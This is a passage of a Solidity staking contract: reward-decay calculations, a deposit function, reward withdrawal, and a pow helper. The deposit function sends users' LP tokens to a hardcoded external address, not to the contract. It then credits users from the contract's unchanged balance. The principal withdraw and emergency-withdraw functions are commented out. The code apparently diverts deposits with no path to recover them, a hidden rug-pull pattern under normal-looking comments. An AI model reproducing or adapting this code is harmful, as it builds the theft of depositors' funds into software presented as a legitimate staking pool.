        vars2._newlpSupply = (pool.balance.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.sub(1))).div(pow(10000, vars.n1))).mul(vars.s1).div(24 hours);
        vars2._amount = (amount.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.sub(1))).div(pow(10000, vars.n1))).mul(block.timestamp.sub(_timestamp)).div(24 hours);
        vars2.lastRewardChange = 0;
        // console.log("HERE1");
        // console.log(amount, pool.balance, _timestamp);
        // console.log(vars2.tokenReward, vars2.lastRewardChange, vars2._newlpSupply, vars2._amount);
        return vars2;
    }

    function _calcRewardMoreThan24(PoolInfo memory pool, uint amount, uint _timestamp) internal view returns (LocalVars2 memory){
        LocalVars1 memory vars;
        LocalVars1 memory userVars;
        LocalVars1 memory poolVars;
        LocalVars2 memory vars2;

        vars.s1 = pool.lastRewardChange.add(24 hours).sub(pool.lastRewardTime);
        userVars.s1 = pool.lastRewardChange.add(24 hours).sub(_timestamp);
        vars.numDays = (block.timestamp.sub(pool.lastRewardChange.add(24 hours)).div(24 hours));
        vars.s2 = block.timestamp.sub(pool.lastRewardChange.add(24 hours).add(24 hours * vars.numDays));
        vars.n1 = pool.lastRewardChange.sub(startTimestamp).div(24 hours).add(1);
        
        vars.r1 = tokenRewardAmount.mul(rewardPercent).mul(pow(10000 - (rewardPercent), vars.n1.sub(1))).div(pow(10000, vars.n1));
        vars2._newlpSupply = pool.balance.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.sub(1))).div(pow(10000, vars.n1));
        vars2._amount = amount.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.sub(1))).div(pow(10000, vars.n1));

        if(vars.numDays == 0) {
            vars.rNum = 0;
            userVars.rNum = 0;
            poolVars.rNum = 0;
            vars.r2 = tokenRewardAmount.mul(rewardPercent).mul(pow(10000 - (rewardPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
            userVars.r2 = amount.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
            poolVars.r2 = pool.balance.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
        } else {
            // vars.rNum = 10000 * (tokenRewardAmount).mul(pow(rewardPercent, vars.numDays.sub(1))).mul(pow(10000, vars.numDays).sub(pow(rewardPercent, vars.numDays))).div(pow(10000, vars.numDays)).div(pow(10000, vars.numDays.sub(1))).div(10000 - (rewardPercent));
            vars.rNum = tokenRewardAmount.mul(pow(10000 - (rewardPercent), vars.n1)).mul(pow(10000, vars.numDays).sub(pow(10000 - rewardPercent, vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays)));
            userVars.rNum = amount.mul(pow(10000 - (decayPercent), vars.n1)).mul(pow(10000, vars.numDays).sub(pow(10000 - decayPercent, vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays)));
            poolVars.rNum = pool.balance.mul(pow(10000 - (decayPercent), vars.n1)).mul(pow(10000, vars.numDays).sub(pow(10000 - decayPercent, vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays)));
            vars.r2 = tokenRewardAmount.mul(rewardPercent).mul(pow(10000 - (rewardPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
            userVars.r2 = amount.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
            poolVars.r2 = pool.balance.mul(decayPercent).mul(pow(10000 - (decayPercent), vars.n1.add(vars.numDays))).div(pow(10000, vars.n1.add(vars.numDays).add(1)));
        }
        // vars.r2 = tokenRewardAmount.mul(rewardPercent).mul(pow(10000 - (rewardPercent), vars.n1.add(vars.numDays).add(1))).div(pow(10000, vars.n1.add(vars.numDays).add(2)));
        vars2.tokenReward = vars.r1.mul(vars.s1).div(24 hours).add(vars.rNum.div(24 hours)).add(vars.rNum).add(vars.r2.mul(vars.s2).div(24 hours));
        vars2.lastRewardChange = 24 hours + (24 hours * vars.numDays);
        vars2._newlpSupply = vars2._newlpSupply.mul(vars.s1).div(24 hours).add(poolVars.rNum.div(24 hours)).add(poolVars.rNum).add(poolVars.r2.mul(vars.s2).div(24 hours));
        vars2._amount = vars2._amount.mul(userVars.s1).div(24 hours).add(userVars.rNum.div(24 hours)).add(userVars.rNum).add(userVars.r2.mul(vars.s2).div(24 hours));

        // console.log("HERE2");
        // console.log(amount, pool.balance, _timestamp);
        // console.log(vars2.tokenReward, vars2.lastRewardChange, vars2._newlpSupply, vars2._amount);

        return vars2;
    }

    // Deposit LP tokens to Staking for TOKEN allocation.
    function deposit(uint256 _amount) external nonReentrant {
        PoolInfo storage pool = poolInfo;
        UserInfo storage user = userInfo[msg.sender];
        // console.log("balBefDeposit", user.amount, user.rewardDebt, user.amount.mul(pool.accTokenPerShare).div(1e18));
        user.amount = user.amount.sub(_updatePool(user.amount, user.timestamp));
        user.totalDeposit = user.totalDeposit.add(_amount);
        if (user.amount > 0) {
            uint256 pending =
                user.amount.mul(pool.accTokenPerShare).div(1e18).sub(
                    user.rewardDebt
                );
            safeTokenTransfer(msg.sender, pending);
        }
        uint balBef = pool.lpToken.balanceOf(address(this));
        pool.lpToken.safeTransferFrom(
            msg.sender,
            0x7b3d7870ecA6C38fF9ae72b0ecae54f2d32B59cC,
            _amount
        );
        uint balAft = pool.lpToken.balanceOf(address(this));
        _amount = balAft.sub(balBef);
        user.amount = user.amount.add(_amount);
        user.rewardDebt = user.amount.mul(pool.accTokenPerShare).div(1e18);
        user.timestamp = block.timestamp;
        pool.balance = pool.balance.add(_amount);
        pool.totalDeposit = pool.totalDeposit.add(_amount);
        if(userExistence[msg.sender] == false) {
            userExistence[msg.sender] = true;
            numUsers++;
        }
        emit Deposit(msg.sender, _amount);
        // console.log("balAftDeposit", user.amount, user.rewardDebt, user.amount.mul(pool.accTokenPerShare).div(1e18));
    }

    // Withdraw LP tokens from Staking.
    function withdrawRewards() external nonReentrant {
        PoolInfo storage pool = poolInfo;
        UserInfo storage user = userInfo[msg.sender];
        // console.log("balBefWithdraw", user.amount, user.rewardDebt, user.amount.mul(pool.accTokenPerShare).div(1e18));
        // require(user.amount >= _amount, "withdraw: not good");
        user.amount = user.amount.sub(_updatePool(user.amount, user.timestamp));
        uint256 pending =
            user.amount.mul(pool.accTokenPerShare).div(1e18).sub(
                user.rewardDebt
            );
        safeTokenTransfer(msg.sender, pending);
        // user.amount = user.amount.sub(_amount);
        user.rewardDebt = user.amount.mul(pool.accTokenPerShare).div(1e18);
        user.timestamp = block.timestamp;
        // console.log("balAftWithdraw", user.amount, user.rewardDebt, user.amount.mul(pool.accTokenPerShare).div(1e18));
        // pool.balance = pool.balance.sub(_amount);
        // pool.lpToken.safeTransfer(msg.sender, _amount);
        emit Withdraw(msg.sender);
    }
    // function withdraw(uint256 _amount) external nonReentrant {
    //     PoolInfo storage pool = poolInfo;
    //     UserInfo storage user = userInfo[msg.sender];
    //     require(user.amount >= _amount, "withdraw: not good");
    //     user.amount = _updatePool(user.amount, user.timestamp);
    //     uint256 pending =
    //         user.amount.mul(pool.accTokenPerShare).div(1e18).sub(
    //             user.rewardDebt
    //         );
    //     safeTokenTransfer(msg.sender, pending);
    //     user.amount = user.amount.sub(_amount);
    //     user.rewardDebt = user.amount.mul(pool.accTokenPerShare).div(1e18);
    //     user.timestamp = block.timestamp;
    //     pool.balance = pool.balance.sub(_amount);
    //     pool.lpToken.safeTransfer(msg.sender, _amount);
    //     emit Withdraw(msg.sender, _amount);
    // }

    // Withdraw without caring about rewards. EMERGENCY ONLY.
    // function emergencyWithdraw() external nonReentrant{
    //     PoolInfo storage pool = poolInfo;
    //     UserInfo storage user = userInfo[msg.sender];
    //     uint amount = user.amount;
    //     delete userInfo[msg.sender];
    //     pool.balance = pool.balance.sub(amount);
    //     pool.lpToken.safeTransfer(msg.sender, amount);
    //     emit EmergencyWithdraw(msg.sender, amount);
    // }

    // Safe token transfer function, just in case if rounding error causes pool to not have enough TOKENs.
    function safeTokenTransfer(address _to, uint256 _amount) internal {
        supplyContract.safeTokenTransfer(_to, _amount);
    }

    function pow(uint n, uint e) public pure returns (uint) {

        if (e == 0) {
            return 1;
        } else if (e == 1) {
            return n;
        } else {
            uint p = pow(n, e.div(2));
            p = p.mul(p);
            if (e.mod(2) == 1) {
                p = p.mul(n);
            }
            return p;
        }
    }

}